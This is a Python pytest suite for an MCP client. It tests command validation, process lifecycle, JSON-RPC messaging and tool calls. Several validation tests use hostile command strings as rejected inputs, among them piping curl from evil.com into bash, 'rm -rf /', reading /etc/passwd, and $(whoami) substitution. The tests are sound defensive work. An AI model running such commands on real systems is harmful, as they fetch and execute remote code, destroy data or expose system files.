"""
Comprehensive test suite for MCP client

Tests cover:
- Command validation (security)
- Client lifecycle (spawn, initialize, shutdown)
- Tool operations (list, call)
- Error handling
- Context manager

Coverage target: 70%+ for mcp_client.py
"""

import pytest
from unittest.mock import Mock, patch, MagicMock, mock_open
from mcp_client import McpClient, McpError, McpState, Tool
import subprocess
import json


class TestMcpClientCommandValidation:
    """Test command validation logic (critical for security)"""

    def test_accepts_safe_npx_command(self):
        """Test that npx commands are accepted"""
        client = McpClient("test", ["npx", "-y", "@server/fs"])
        assert client.command == ["npx", "-y", "@server/fs"]

    def test_accepts_safe_python_command(self):
        """Test that python commands are accepted"""
        client = McpClient("test", ["python", "-m", "http.server"])
        assert client.command == ["python", "-m", "http.server"]

    def test_accepts_safe_python3_command(self):
        """Test that python3 commands are accepted"""
        client = McpClient("test", ["python3", "-m", "http.server"])
        assert client.command == ["python3", "-m", "http.server"]

    def test_accepts_safe_node_command(self):
        """Test that node commands are accepted"""
        client = McpClient("test", ["node", "server.js"])
        assert client.command == ["node", "server.js"]

    def test_accepts_safe_cargo_command(self):
        """Test that cargo commands are accepted"""
        client = McpClient("test", ["cargo", "run", "--bin", "server"])
        assert client.command == ["cargo", "run", "--bin", "server"]

    def test_accepts_safe_echo_command(self):
        """Test that echo commands are accepted (testing)"""
        client = McpClient("test", ["echo", "test"])
        assert client.command == ["echo", "test"]

    def test_rejects_empty_command(self):
        """Test that empty commands are rejected"""
        with pytest.raises(McpError, match="Command must be a non-empty list"):
            McpClient("test", [])

    def test_rejects_non_list_command(self):
        """Test that non-list commands are rejected"""
        with pytest.raises(McpError, match="Command must be a non-empty list"):
            McpClient("test", "echo test")  # type: ignore

    def test_rejects_command_with_shell_semicolon(self):
        """Test that commands with semicolon are rejected (shell injection)"""
        with pytest.raises(McpError, match="shell metacharacter"):
            McpClient("test", ["rm", "-rf", "/", ";", "ls"])

    def test_rejects_command_with_shell_ampersand(self):
        """Test that commands with ampersand are rejected"""
        with pytest.raises(McpError, match="shell metacharacter"):
            McpClient("test", ["cat", "/etc/passwd", "&", "malicious"])

    def test_rejects_command_with_shell_pipe(self):
        """Test that commands with pipe are rejected"""
        with pytest.raises(McpError, match="shell metacharacter"):
            McpClient("test", ["curl", "http://evil.com", "|", "bash"])

    def test_rejects_command_with_dollar_sign(self):
        """Test that commands with $ are rejected (variable expansion)"""
        with pytest.raises(McpError, match="shell metacharacter"):
            McpClient("test", ["ls", "$(whoami)"])

    def test_rejects_command_with_backtick(self):
        """Test that commands with backticks are rejected (command substitution)"""
        with pytest.raises(McpError, match="shell metacharacter"):
            McpClient("test", ["test", "`id`"])

    def test_rejects_command_with_parentheses(self):
        """Test that commands with parentheses are rejected (subshell)"""
        with pytest.raises(McpError, match="shell metacharacter"):
            McpClient("test", ["test", "(malicious)"])

    def test_rejects_command_with_redirect(self):
        """Test that commands with redirects are rejected"""
        with pytest.raises(McpError, match="shell metacharacter"):
            McpClient("test", ["cat", "/etc/passwd", ">", "/tmp/out"])

    def test_rejects_command_with_newline(self):
        """Test that commands with newlines are rejected (command injection)"""
        with pytest.raises(McpError, match="shell metacharacter"):
            McpClient("test", ["test\n", "malicious"])

    def test_rejects_non_string_arguments(self):
        """Test that non-string arguments are rejected"""
        with pytest.raises(McpError, match="All command arguments must be strings"):
            McpClient("test", ["echo", 123])  # type: ignore

    def test_warns_unknown_command(self, capsys):
        """Test that unknown commands generate warning"""
        client = McpClient("test", ["unknown-command", "--arg"])
        captured = capsys.readouterr()
        assert "not in known-safe list" in captured.err

    def test_handles_path_to_safe_command(self):
        """Test that paths to safe commands work"""
        client = McpClient("test", ["./node_modules/.bin/npx", "-y", "@server/fs"])
        assert client.command[0] == "./node_modules/.bin/npx"


class TestMcpClientInitialization:
    """Test MCP client initialization and state management"""

    def test_client_initial_state_is_disconnected(self):
        """Test that new clients start in DISCONNECTED state"""
        client = McpClient("test", ["echo", "test"])
        assert client.state == McpState.DISCONNECTED

    def test_client_stores_server_name(self):
        """Test that server name is stored"""
        client = McpClient("my-server", ["echo", "test"])
        assert client.server_name == "my-server"

    def test_client_stores_root_dir(self):
        """Test that root_dir is stored"""
        client = McpClient("test", ["echo", "test"], root_dir="/tmp")
        assert client.root_dir == "/tmp"

    def test_client_stores_args(self):
        """Test that args are stored"""
        client = McpClient("test", ["echo", "test"], args=["--verbose"])
        assert client.args == ["--verbose"]

    def test_client_defaults_args_to_empty_list(self):
        """Test that args defaults to empty list"""
        client = McpClient("test", ["echo", "test"])
        assert client.args == []

    def test_request_id_starts_at_zero(self):
        """Test that request ID counter starts at 0"""
        client = McpClient("test", ["echo", "test"])
        assert client._request_id == 0


class TestMcpClientLifecycle:
    """Test MCP client lifecycle methods (spawn, initialize, shutdown)"""

    @patch("subprocess.Popen")
    def test_spawn_creates_subprocess(self, mock_popen):
        """Test that spawn() creates subprocess with correct command"""
        mock_process = MagicMock()
        mock_process.stdin = MagicMock()
        mock_process.stdout = MagicMock()
        mock_process.stderr = MagicMock()
        mock_popen.return_value = mock_process

        client = McpClient("test", ["npx", "-y", "@server/fs"])
        client.spawn()

        # Check that Popen was called with correct command
        expected_cmd = ["cargo", "run", "--", "mcp", "stdio", "npx", "-y", "@server/fs"]
        mock_popen.assert_called_once()
        call_args = mock_popen.call_args
        assert call_args[0][0] == expected_cmd

        # Check that stdin/stdout/stderr are set to PIPE
        assert call_args[1]["stdin"] == subprocess.PIPE
        assert call_args[1]["stdout"] == subprocess.PIPE
        assert call_args[1]["stderr"] == subprocess.PIPE

    @patch("subprocess.Popen")
    def test_spawn_transitions_to_connected_state(self, mock_popen):
        """Test that spawn() changes state to CONNECTED"""
        mock_process = MagicMock()
        mock_process.stdin = MagicMock()
        mock_process.stdout = MagicMock()
        mock_process.stderr = MagicMock()
        mock_popen.return_value = mock_process

        client = McpClient("test", ["echo", "test"])
        client.spawn()

        assert client.state == McpState.CONNECTED

    @patch("subprocess.Popen")
    def test_spawn_raises_error_when_already_connected(self, mock_popen):
        """Test that spawn() raises error when not in DISCONNECTED state"""
        mock_process = MagicMock()
        mock_process.stdin = MagicMock()
        mock_process.stdout = MagicMock()
        mock_process.stderr = MagicMock()
        mock_popen.return_value = mock_process

        client = McpClient("test", ["echo", "test"])
        client.spawn()
        client._state = McpState.CONNECTED

        with pytest.raises(McpError, match="Cannot spawn: client is connected"):
            client.spawn()

    @patch("subprocess.Popen")
    def test_spawn_handles_file_not_found_error(self, mock_popen):
        """Test that spawn() handles missing cargo executable"""
        mock_popen.side_effect = FileNotFoundError("cargo not found")

        client = McpClient("test", ["echo", "test"])
        with pytest.raises(McpError, match="Failed to spawn orchestrator"):
            client.spawn()

    @patch("subprocess.Popen")
    @patch("time.sleep")
    def test_initialize_sends_handshake(self, mock_sleep, mock_popen):
        """Test that initialize() sends correct handshake request"""
        mock_process = MagicMock()
        mock_process.stdin = MagicMock()
        mock_process.stdout = MagicMock()
        mock_process.stdout.readline = MagicMock(return_value='{"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2024-11-05"}}\n')
        mock_process.stderr = MagicMock()
        mock_popen.return_value = mock_process

        client = McpClient("test", ["echo", "test"])
        client.spawn()

        # Mock the request sending
        with patch.object(client, "_send_request") as mock_send:
            mock_send.return_value = {"result": {"protocolVersion": "2024-11-05"}}
            client.initialize()

            # Check that initialize was called with correct params
            mock_send.assert_called_once()
            call_args = mock_send.call_args
            assert call_args[0][0] == "initialize"
            assert "protocolVersion" in call_args[0][1]
            assert call_args[0][1]["protocolVersion"] == "2024-11-05"

    @patch("subprocess.Popen")
    def test_initialize_transitions_to_initialized_state(self, mock_popen):
        """Test that initialize() changes state to INITIALIZED"""
        mock_process = MagicMock()
        mock_process.stdin = MagicMock()
        mock_process.stdout = MagicMock()
        mock_process.stderr = MagicMock()
        mock_popen.return_value = mock_process

        client = McpClient("test", ["echo", "test"])
        client.spawn()

        with patch.object(client, "_send_request") as mock_send:
            mock_send.return_value = {"result": {"protocolVersion": "2024-11-05"}}
            client.initialize()

        assert client.state == McpState.INITIALIZED

    @patch("subprocess.Popen")
    def test_initialize_raises_error_when_not_connected(self, mock_popen):
        """Test that initialize() raises error when not in CONNECTED state"""
        mock_process = MagicMock()
        mock_process.stdin = MagicMock()
        mock_process.stdout = MagicMock()
        mock_process.stderr = MagicMock()
        mock_popen.return_value = mock_process

        client = McpClient("test", ["echo", "test"])
        client._state = McpState.DISCONNECTED

        with pytest.raises(McpError, match="Cannot initialize: client is disconnected"):
            client.initialize()

    @patch("subprocess.Popen")
    def test_initialize_raises_error_on_invalid_response(self, mock_popen):
        """Test that initialize() raises error on malformed response"""
        mock_process = MagicMock()
        mock_process.stdin = MagicMock()
        mock_process.stdout = MagicMock()
        mock_process.stderr = MagicMock()
        mock_popen.return_value = mock_process

        client = McpClient("test", ["echo", "test"])
        client.spawn()

        with patch.object(client, "_send_request") as mock_send:
            mock_send.return_value = {"error": "invalid"}  # Missing "result"

            with pytest.raises(McpError, match="Initialize failed"):
                client.initialize()

    @patch("subprocess.Popen")
    def test_shutdown_terminates_process(self, mock_popen):
        """Test that shutdown() terminates the subprocess"""
        mock_process = MagicMock()
        mock_process.stdin = MagicMock()
        mock_process.stdout = MagicMock()
        mock_process.stderr = MagicMock()
        mock_process.wait = MagicMock(return_value=0)
        mock_popen.return_value = mock_process

        client = McpClient("test", ["echo", "test"])
        client.spawn()
        client.shutdown()

        # Check that terminate was called
        mock_process.terminate.assert_called_once()
        mock_process.stdin.close.assert_called_once()

    @patch("subprocess.Popen")
    def test_shutdown_kills_process_if_terminate_fails(self, mock_popen):
        """Test that shutdown() kills process if terminate times out"""
        mock_process = MagicMock()
        mock_process.stdin = MagicMock()
        mock_process.stdout = MagicMock()
        mock_process.stderr = MagicMock()
        mock_process.wait = MagicMock(side_effect=[Exception("timeout"), 0])
        mock_popen.return_value = mock_process

        client = McpClient("test", ["echo", "test"])
        client.spawn()
        client.shutdown()

        # Check that kill was called as fallback
        mock_process.kill.assert_called_once()

    @patch("subprocess.Popen")
    def test_shutdown_transitions_to_shutdown_state(self, mock_popen):
        """Test that shutdown() changes state to SHUTDOWN"""
        mock_process = MagicMock()
        mock_process.stdin = MagicMock()
        mock_process.stdout = MagicMock()
        mock_process.stderr = MagicMock()
        mock_process.wait = MagicMock(return_value=0)
        mock_popen.return_value = mock_process

        client = McpClient("test", ["echo", "test"])
        client.spawn()
        client.shutdown()

        assert client.state == McpState.SHUTDOWN

    @patch("subprocess.Popen")
    def test_shutdown_is_idempotent(self, mock_popen):
        """Test that calling shutdown() multiple times is safe"""
        mock_process = MagicMock()
        mock_process.stdin = MagicMock()
        mock_process.stdout = MagicMock()
        mock_process.stderr = MagicMock()
        mock_process.wait = MagicMock(return_value=0)
        mock_popen.return_value = mock_process

        client = McpClient("test", ["echo", "test"])
        client.spawn()
        client.shutdown()
        client.shutdown()  # Should not raise

        assert mock_process.terminate.call_count == 1


class TestMcpClientSendRequest:
    """Test MCP client request sending logic"""

    @patch("subprocess.Popen")
    def test_send_request_increments_request_id(self, mock_popen):
        """Test that _send_request() increments request ID"""
        mock_process = MagicMock()
        mock_process.stdin = MagicMock()
        mock_process.stdout = MagicMock()
        mock_process.stdout.readline = MagicMock(return_value='{"jsonrpc":"2.0","id":1,"result":{}}\n')
        mock_process.stderr = MagicMock()
        mock_popen.return_value = mock_process

        client = McpClient("test", ["echo", "test"])
        client._process = mock_process
        client._state = McpState.INITIALIZED

        initial_id = client._request_id
        client._send_request("test/method")

        assert client._request_id == initial_id + 1

    @patch("subprocess.Popen")
    def test_send_request_sends_json_rpc_2_0_format(self, mock_popen):
        """Test that _send_request() sends valid JSON-RPC 2.0"""
        mock_process = MagicMock()
        mock_process.stdin = MagicMock()
        mock_process.stdout = MagicMock()
        mock_process.stdout.readline = MagicMock(return_value='{"jsonrpc":"2.0","id":1,"result":{}}\n')
        mock_process.stderr = MagicMock()
        mock_popen.return_value = mock_process

        client = McpClient("test", ["echo", "test"])
        client._process = mock_process
        client._state = McpState.INITIALIZED

        client._send_request("test/method", {"param1": "value1"})

        # Check that JSON was written to stdin
        assert mock_process.stdin.write.called
        assert mock_process.stdin.flush.called

        # Parse the written JSON
        written_data = mock_process.stdin.write.call_args[0][0]
        request = json.loads(written_data.decode())

        assert request["jsonrpc"] == "2.0"
        assert request["method"] == "test/method"
        assert request["params"] == {"param1": "value1"}
        assert "id" in request

    @patch("subprocess.Popen")
    def test_send_request_raises_error_when_shutdown(self, mock_popen):
        """Test that _send_request() raises error when client is shut down"""
        mock_process = MagicMock()
        mock_process.stdin = MagicMock()
        mock_process.stdout = MagicMock()
        mock_process.stderr = MagicMock()
        mock_popen.return_value = mock_process

        client = McpClient("test", ["echo", "test"])
        client._state = McpState.SHUTDOWN

        with pytest.raises(McpError, match="Cannot send request: client is shut down"):
            client._send_request("test/method")

    @patch("subprocess.Popen")
    def test_send_request_handles_broken_pipe(self, mock_popen):
        """Test that _send_request() handles broken pipe errors"""
        mock_process = MagicMock()
        mock_process.stdin = MagicMock()
        mock_process.stdin.write = MagicMock(side_effect=BrokenPipeError("Pipe broken"))
        mock_process.stdout = MagicMock()
        mock_process.stderr = MagicMock()
        mock_popen.return_value = mock_process

        client = McpClient("test", ["echo", "test"])
        client._process = mock_process
        client._state = McpState.INITIALIZED

        with pytest.raises(McpError, match="Failed to send request"):
            client._send_request("test/method")

    @patch("subprocess.Popen")
    def test_send_request_handles_no_response(self, mock_popen):
        """Test that _send_request() handles no response from process"""
        mock_process = MagicMock()
        mock_process.stdin = MagicMock()
        mock_process.stdout = MagicMock()
        mock_process.stdout.readline = MagicMock(return_value="")  # Empty response
        mock_process.stderr = MagicMock()
        mock_popen.return_value = mock_process

        client = McpClient("test", ["echo", "test"])
        client._process = mock_process
        client._state = McpState.INITIALIZED

        with pytest.raises(McpError, match="No response from orchestrator"):
            client._send_request("test/method")

    @patch("subprocess.Popen")
    def test_send_request_handles_invalid_json(self, mock_popen):
        """Test that _send_request() handles invalid JSON response"""
        mock_process = MagicMock()
        mock_process.stdin = MagicMock()
        mock_process.stdout = MagicMock()
        mock_process.stdout.readline = MagicMock(return_value="not json\n")
        mock_process.stderr = MagicMock()
        mock_popen.return_value = mock_process

        client = McpClient("test", ["echo", "test"])
        client._process = mock_process
        client._state = McpState.INITIALIZED

        with pytest.raises(McpError, match="Invalid JSON response"):
            client._send_request("test/method")

    @patch("subprocess.Popen")
    def test_send_request_handles_json_rpc_error(self, mock_popen):
        """Test that _send_request() handles JSON-RPC error responses"""
        mock_process = MagicMock()
        mock_process.stdin = MagicMock()
        mock_process.stdout = MagicMock()
        mock_process.stdout.readline = MagicMock(
            return_value='{"jsonrpc":"2.0","id":1,"error":{"code":-32600,"message":"Invalid Request"}}\n'
        )
        mock_process.stderr = MagicMock()
        mock_popen.return_value = mock_process

        client = McpClient("test", ["echo", "test"])
        client._process = mock_process
        client._state = McpState.INITIALIZED

        with pytest.raises(McpError, match="MCP error -32600"):
            client._send_request("test/method")


class TestMcpClientToolOperations:
    """Test MCP client tool operations (list_tools, call_tool)"""

    @patch("subprocess.Popen")
    def test_list_tools_returns_tool_list(self, mock_popen):
        """Test that list_tools() returns list of Tool objects"""
        mock_process = MagicMock()
        mock_process.stdin = MagicMock()
        mock_process.stdout = MagicMock()
        mock_process.stderr = MagicMock()
        mock_popen.return_value = mock_process

        client = McpClient("test", ["echo", "test"])
        client._process = mock_process
        client._state = McpState.INITIALIZED

        # Mock successful response
        with patch.object(client, "_send_request") as mock_send:
            mock_send.return_value = {
                "result": {
                    "tools": [
                        {
                            "name": "read_file",
                            "description": "Read a file",
                            "inputSchema": {"type": "object"}
                        },
                        {
                            "name": "write_file",
                            "description": "Write a file",
                            "inputSchema": {"type": "object"}
                        }
                    ]
                }
            }

            tools = client.list_tools()

            assert len(tools) == 2
            assert tools[0].name == "read_file"
            assert tools[0].description == "Read a file"
            assert tools[1].name == "write_file"

    @patch("subprocess.Popen")
    def test_list_tools_handles_missing_description(self, mock_popen):
        """Test that list_tools() handles tools without descriptions"""
        mock_process = MagicMock()
        mock_process.stdin = MagicMock()
        mock_process.stdout = MagicMock()
        mock_process.stderr = MagicMock()
        mock_popen.return_value = mock_process

        client = McpClient("test", ["echo", "test"])
        client._process = mock_process
        client._state = McpState.INITIALIZED

        with patch.object(client, "_send_request") as mock_send:
            mock_send.return_value = {
                "result": {
                    "tools": [
                        {
                            "name": "tool_no_desc",
                            "inputSchema": {"type": "object"}
                        }
                    ]
                }
            }

            tools = client.list_tools()

            assert len(tools) == 1
            assert tools[0].name == "tool_no_desc"
            assert tools[0].description == ""  # Default to empty string

    @patch("subprocess.Popen")
    def test_list_tools_handles_missing_input_schema(self, mock_popen):
        """Test that list_tools() handles tools without input schema"""
        mock_process = MagicMock()
        mock_process.stdin = MagicMock()
        mock_process.stdout = MagicMock()
        mock_process.stderr = MagicMock()
        mock_popen.return_value = mock_process

        client = McpClient("test", ["echo", "test"])
        client._process = mock_process
        client._state = McpState.INITIALIZED

        with patch.object(client, "_send_request") as mock_send:
            mock_send.return_value = {
                "result": {
                    "tools": [
                        {
                            "name": "simple_tool",
                            "description": "A simple tool"
                        }
                    ]
                }
            }

            tools = client.list_tools()

            assert len(tools) == 1
            assert tools[0].input_schema == {}  # Default to empty dict

    @patch("subprocess.Popen")
    def test_list_tools_raises_error_when_not_initialized(self, mock_popen):
        """Test that list_tools() raises error when not in INITIALIZED state"""
        mock_process = MagicMock()
        mock_process.stdin = MagicMock()
        mock_process.stdout = MagicMock()
        mock_process.stderr = MagicMock()
        mock_popen.return_value = mock_process

        client = McpClient("test", ["echo", "test"])
        client._state = McpState.CONNECTED

        with pytest.raises(McpError, match="Cannot list tools: client is connected"):
            client.list_tools()

    @patch("subprocess.Popen")
    def test_list_tools_handles_invalid_response(self, mock_popen):
        """Test that list_tools() handles invalid response"""
        mock_process = MagicMock()
        mock_process.stdin = MagicMock()
        mock_process.stdout = MagicMock()
        mock_process.stderr = MagicMock()
        mock_popen.return_value = mock_process

        client = McpClient("test", ["echo", "test"])
        client._process = mock_process
        client._state = McpState.INITIALIZED

        with patch.object(client, "_send_request") as mock_send:
            mock_send.return_value = {"error": "invalid"}

            with pytest.raises(McpError, match="tools/list failed"):
                client.list_tools()

    @patch("subprocess.Popen")
    def test_call_tool_invokes_tool_with_arguments(self, mock_popen):
        """Test that call_tool() sends correct request"""
        mock_process = MagicMock()
        mock_process.stdin = MagicMock()
        mock_process.stdout = MagicMock()
        mock_process.stderr = MagicMock()
        mock_popen.return_value = mock_process

        client = McpClient("test", ["echo", "test"])
        client._process = mock_process
        client._state = McpState.INITIALIZED

        with patch.object(client, "_send_request") as mock_send:
            mock_send.return_value = {
                "result": {
                    "content": ["File content here"]
                }
            }

            result = client.call_tool("read_file", {"path": "test.txt"})

            mock_send.assert_called_once()
            call_args = mock_send.call_args
            assert call_args[0][0] == "tools/call"
            assert call_args[0][1]["name"] == "read_file"
            assert call_args[0][1]["arguments"] == {"path": "test.txt"}
            assert result["content"] == ["File content here"]

    @patch("subprocess.Popen")
    def test_call_tool_raises_error_when_not_initialized(self, mock_popen):
        """Test that call_tool() raises error when not in INITIALIZED state"""
        mock_process = MagicMock()
        mock_process.stdin = MagicMock()
        mock_process.stdout = MagicMock()
        mock_process.stderr = MagicMock()
        mock_popen.return_value = mock_process

        client = McpClient("test", ["echo", "test"])
        client._state = McpState.CONNECTED

        with pytest.raises(McpError, match="Cannot call tool: client is connected"):
            client.call_tool("read_file", {})

    @patch("subprocess.Popen")
    def test_call_tool_handles_invalid_response(self, mock_popen):
        """Test that call_tool() handles invalid response"""
        mock_process = MagicMock()
        mock_process.stdin = MagicMock()
        mock_process.stdout = MagicMock()
        mock_process.stderr = MagicMock()
        mock_popen.return_value = mock_process

        client = McpClient("test", ["echo", "test"])
        client._process = mock_process
        client._state = McpState.INITIALIZED

        with patch.object(client, "_send_request") as mock_send:
            mock_send.return_value = {"error": "tool not found"}

            with pytest.raises(McpError, match="tools/call failed"):
                client.call_tool("unknown_tool", {})


class TestMcpClientContextManager:
    """Test MCP client context manager protocol"""

    @patch("subprocess.Popen")
    @patch("time.sleep")
    def test_context_manager_spawns_and_initializes(self, mock_sleep, mock_popen):
        """Test that context manager spawns and initializes on enter"""
        mock_process = MagicMock()
        mock_process.stdin = MagicMock()
        mock_process.stdout = MagicMock()
        mock_process.stderr = MagicMock()
        mock_process.wait = MagicMock(return_value=0)
        mock_popen.return_value = mock_process

        with patch.object(McpClient, "_send_request") as mock_send:
            mock_send.return_value = {"result": {"protocolVersion": "2024-11-05"}}

            client = McpClient("test", ["echo", "test"])
            with client:
                assert client.state == McpState.INITIALIZED

    @patch("subprocess.Popen")
    def test_context_manager_shutdown_on_exit(self, mock_popen):
        """Test that context manager shuts down on exit"""
        mock_process = MagicMock()
        mock_process.stdin = MagicMock()
        mock_process.stdout = MagicMock()
        mock_process.stderr = MagicMock()
        mock_process.wait = MagicMock(return_value=0)
        mock_popen.return_value = mock_process

        # Mock _send_request to return valid response
        with patch.object(McpClient, "_send_request") as mock_send:
            mock_send.return_value = {"result": {"protocolVersion": "2024-11-05"}}

            client = McpClient("test", ["echo", "test"])
            with client:
                pass

            assert client.state == McpState.SHUTDOWN
            mock_process.terminate.assert_called_once()

    @patch("subprocess.Popen")
    def test_context_manager_returns_self_on_enter(self, mock_popen):
        """Test that context manager returns self on __enter__"""
        mock_process = MagicMock()
        mock_process.stdin = MagicMock()
        mock_process.stdout = MagicMock()
        mock_process.stderr = MagicMock()
        mock_process.wait = MagicMock(return_value=0)
        mock_popen.return_value = mock_process

        with patch.object(McpClient, "_send_request") as mock_send:
            mock_send.return_value = {"result": {"protocolVersion": "2024-11-05"}}

            client = McpClient("test", ["echo", "test"])
            with client as ctx:
                assert ctx is client


class TestToolDataclass:
    """Test Tool dataclass"""

    def test_tool_creation(self):
        """Test creating a Tool object"""
        tool = Tool(
            name="test_tool",
            description="A test tool",
            input_schema={"type": "object"}
        )

        assert tool.name == "test_tool"
        assert tool.description == "A test tool"
        assert tool.input_schema == {"type": "object"}

    def test_tool_equality(self):
        """Test Tool equality"""
        tool1 = Tool("tool", "desc", {})
        tool2 = Tool("tool", "desc", {})

        assert tool1 == tool2


class TestMcpStateEnum:
    """Test McpState enum"""

    def test_state_values(self):
        """Test that state enum has correct values"""
        assert McpState.DISCONNECTED.value == "disconnected"
        assert McpState.CONNECTED.value == "connected"
        assert McpState.INITIALIZED.value == "initialized"
        assert McpState.SHUTDOWN.value == "shutdown"


class TestMcpError:
    """Test McpError exception"""

    def test_error_can_be_raised(self):
        """Test that McpError can be raised and caught"""
        with pytest.raises(McpError):
            raise McpError("Test error")

    def test_error_message_preserved(self):
        """Test that error message is preserved"""
        error = McpError("Test message")
        assert str(error) == "Test message"
        assert "Test message" in error.args[0]
